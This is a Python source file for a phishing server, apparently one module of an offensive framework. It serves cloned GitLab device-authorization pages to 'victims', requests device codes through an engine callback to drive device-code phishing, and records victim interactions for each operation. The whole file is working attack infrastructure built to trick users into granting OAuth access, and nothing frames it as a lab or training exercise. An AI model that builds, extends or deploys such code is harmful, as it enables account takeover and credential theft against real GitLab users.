"""
Phishing Server module for serving phishing pages to victims.

This module implements a Flask-based web server that serves operation-specific
phishing pages, handles device code generation, and tracks victim interactions.
"""

import logging
import threading
from typing import Dict, Optional, Callable
from flask import Flask, render_template, request, jsonify, abort
from werkzeug.serving import make_server

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.interfaces import PhishingServerInterface
from src.models import Config, OperationConfig


logger = logging.getLogger(__name__)


class PhishingServer(PhishingServerInterface):
    """
    Flask-based phishing server for multi-operation support.
    
    This server hosts operation-specific phishing pages that clone the GitLab
    device authorization interface. Each operation has its own URL path and
    configuration.
    """
    
    def __init__(self, config: Config):
        """
        Initialize the Phishing Server.
        
        Args:
            config: Framework configuration object
        """
        self.config = config
        self.app = Flask(
            __name__,
            template_folder=str(Path(__file__).parent.parent / 'web' / 'templates'),
            static_folder=str(Path(__file__).parent.parent / 'web' / 'static')
        )
        
        # Dictionary to store active operations: {operation_id: OperationConfig}
        self.operations: Dict[int, OperationConfig] = {}
        
        # Lock for thread-safe operations dictionary access
        self.operations_lock = threading.Lock()
        
        # Server thread and instance
        self.server = None
        self.server_thread = None
        self.is_running = False
        
        # Callback for device code generation (set by core engine)
        self.device_code_callback: Optional[Callable] = None
        
        # Callback for interaction tracking (set by core engine)
        self.interaction_callback: Optional[Callable] = None
        
        # Setup Flask routes
        self._setup_routes()
        
        # Disable Flask's default logging for cleaner output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.WARNING)
    

        

    
    def _setup_routes(self):
        """Setup Flask routes for the phishing server."""
        
        @self.app.route('/op/<int:operation_id>')
        def phishing_page(operation_id: int):
            """
            Serve the phishing page for a specific operation.
            
            Args:
                operation_id: ID of the operation
                
            Returns:
                Rendered phishing page HTML or 404 if operation not found
            """
            with self.operations_lock:
                operation_config = self.operations.get(operation_id)
            
            if not operation_config:
                logger.warning(f"Access attempt to non-existent operation: {operation_id}")
                abort(404)
            
            # Get client information
            # IP tracking removed by user request
            ip_address = "0.0.0.0"
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            logger.info(f"Phishing page accessed: operation_id={operation_id}")
            
            # Track page view interaction
            if self.interaction_callback:
                try:
                    self.interaction_callback(
                        operation_id=operation_id,
                        interaction_type='page_view',
                        ip_address=ip_address,
                        user_agent=user_agent
                    )
                except Exception as e:
                    logger.error(f"Error in interaction callback: {e}")
            
            # Render phishing page with operation configuration
            return render_template(
                'phishing_gitlab.html',
                operation_id=operation_id,
                base_url=operation_config.base_url,
                instance_type=operation_config.instance_type
            )
        
        @self.app.route('/op/<int:operation_id>/api/generate_code', methods=['POST'])
        def generate_code(operation_id: int):
            """
            Generate a device code for a victim.
            
            This endpoint is called by the phishing page JavaScript to dynamically
            generate a device code when the victim loads the page.
            
            Args:
                operation_id: ID of the operation
                
            Returns:
                JSON response with device code data or error
            """
            with self.operations_lock:
                operation_config = self.operations.get(operation_id)
            
            if not operation_config:
                logger.warning(f"Code generation attempt for non-existent operation: {operation_id}")
                return jsonify({'error': 'Operation not found'}), 404
            
            # Get client information
            # IP tracking removed by user request
            ip_address = "0.0.0.0" 
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            logger.info(f"Device code generation requested: operation_id={operation_id}")
            
            # Call device code generation callback (provided by core engine)
            if not self.device_code_callback:
                logger.error("Device code callback not set")
                return jsonify({'error': 'Server configuration error'}), 500
            
            try:
                result = self.device_code_callback(
                    operation_id=operation_id,
                    ip_address=ip_address,
                    user_agent=user_agent
                )
                
                if result.get('success'):
                    logger.info(f"Device code generated: operation_id={operation_id}, user_code={result['data']['user_code']}")
                    return jsonify({
                        'success': True,
                        'data': {
                            'user_code': result['data']['user_code'],
                            'verification_uri': result['data']['verification_uri'],
                            'verification_uri_complete': result['data']['verification_uri_complete'],
                            'expires_in': result['data']['expires_in']
                        }
                    })
                else:
                    logger.error(f"Device code generation failed: {result.get('error')}")
                    return jsonify({
                        'success': False,
                        'error': result.get('error', 'Unknown error')
                    }), 500
                    
            except Exception as e:
                logger.exception(f"Error generating device code: {e}")
                return jsonify({'error': 'Internal server error'}), 500
        
        @self.app.route('/op/<int:operation_id>/api/interaction', methods=['POST'])
        def track_interaction(operation_id: int):
            """
            Track victim interactions with the phishing page.
            
            This endpoint receives interaction events from the phishing page JavaScript,
            such as code copied, button clicked, etc.
            
            Args:
                operation_id: ID of the operation
                
            Returns:
                JSON response confirming interaction tracked
            """
            with self.operations_lock:
                operation_config = self.operations.get(operation_id)
            
            if not operation_config:
                return jsonify({'error': 'Operation not found'}), 404
            
            # Get interaction data from request
            data = request.get_json() or {}
            interaction_type = data.get('type', 'unknown')
            
            # Get client information
            # IP tracking removed by user request
            ip_address = "0.0.0.0"
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            logger.info(f"Interaction tracked: operation_id={operation_id}, type={interaction_type}")
            
            # Call interaction tracking callback
            if self.interaction_callback:
                try:
                    self.interaction_callback(
                        operation_id=operation_id,
                        interaction_type=interaction_type,
                        ip_address=ip_address,
                        user_agent=user_agent,
                        data=data
                    )
                except Exception as e:
                    logger.error(f"Error in interaction callback: {e}")
            
            return jsonify({'success': True})
        
        @self.app.errorhandler(404)
        def not_found(error):
            """Handle 404 errors without revealing server information."""
            return "Not Found", 404
        
        @self.app.errorhandler(500)
        def internal_error(error):
            """Handle 500 errors without revealing server information."""
            logger.error(f"Internal server error: {error}")
            return "Internal Server Error", 500
    
    def set_device_code_callback(self, callback: Callable) -> None:
        """
        Set callback function for device code generation.
        
        Args:
            callback: Function that takes (operation_id, ip_address, user_agent)
                     and returns a result dict with device code data
        """
        self.device_code_callback = callback
        logger.debug("Device code callback set")
    
    def set_interaction_callback(self, callback: Callable) -> None:
        """
        Set callback function for interaction tracking.
        
        Args:
            callback: Function that takes (operation_id, interaction_type, ip_address, user_agent, data)
        """
        self.interaction_callback = callback
        logger.debug("Interaction callback set")
    
    def start(self) -> bool:
        """
        Start the phishing server.
        
        Returns:
            True if server started successfully, False otherwise
        """
        if self.is_running:
            logger.warning("Phishing server is already running")
            return True
        
        try:
            # Create server instance
            self.server = make_server(
                self.config.host,
                self.config.phishing_port,
                self.app,
                threaded=True
            )
            
            # Start server in a separate thread
            self.server_thread = threading.Thread(
                target=self.server.serve_forever,
                daemon=True,
                name="PhishingServerThread"
            )
            self.server_thread.start()
            
            self.is_running = True
            logger.info(f"Phishing server started on {self.config.host}:{self.config.phishing_port}")
            return True
            
        except OSError as e:
            if "Address already in use" in str(e):
                logger.error(f"Port {self.config.phishing_port} is already in use")
            else:
                logger.error(f"Failed to start phishing server: {e}")
            return False
        
        except Exception as e:
            logger.exception(f"Unexpected error starting phishing server: {e}")
            return False
    
    def stop(self) -> bool:
        """
        Stop the phishing server.
        
        Returns:
            True if server stopped successfully, False otherwise
        """
        if not self.is_running:
            logger.warning("Phishing server is not running")
            return True
        
        try:
            if self.server:
                logger.info("Stopping phishing server...")
                self.server.shutdown()
                
                # Wait for server thread to finish
                if self.server_thread and self.server_thread.is_alive():
                    self.server_thread.join(timeout=5)
                
                self.server = None
                self.server_thread = None
            
            self.is_running = False
            logger.info("Phishing server stopped")
            return True
            
        except Exception as e:
            logger.exception(f"Error stopping phishing server: {e}")
            return False
    
    def register_operation(self, operation_id: int, config: OperationConfig) -> bool:
        """
        Register a new operation with the phishing server.
        
        Args:
            operation_id: ID of the operation
            config: OperationConfig object with operation details
            
        Returns:
            True if operation registered successfully, False otherwise
        """
        with self.operations_lock:
            if operation_id in self.operations:
                logger.warning(f"Operation {operation_id} is already registered")
                return False
            
            self.operations[operation_id] = config
            logger.info(f"Operation registered: id={operation_id}, name={config.name}, base_url={config.base_url}")
            return True
    
    def unregister_operation(self, operation_id: int) -> bool:
        """
        Unregister an operation from the phishing server.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            True if operation unregistered successfully, False otherwise
        """
        with self.operations_lock:
            if operation_id not in self.operations:
                logger.warning(f"Operation {operation_id} is not registered")
                return False
            
            operation_config = self.operations.pop(operation_id)
            logger.info(f"Operation unregistered: id={operation_id}, name={operation_config.name}")
            return True
    
    def get_registered_operations(self) -> Dict[int, OperationConfig]:
        """
        Get all registered operations.
        
        Returns:
            Dictionary of operation_id to OperationConfig
        """
        with self.operations_lock:
            return self.operations.copy()
    
    def is_operation_registered(self, operation_id: int) -> bool:
        """
        Check if an operation is registered.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            True if operation is registered, False otherwise
        """
        with self.operations_lock:
            return operation_id in self.operations
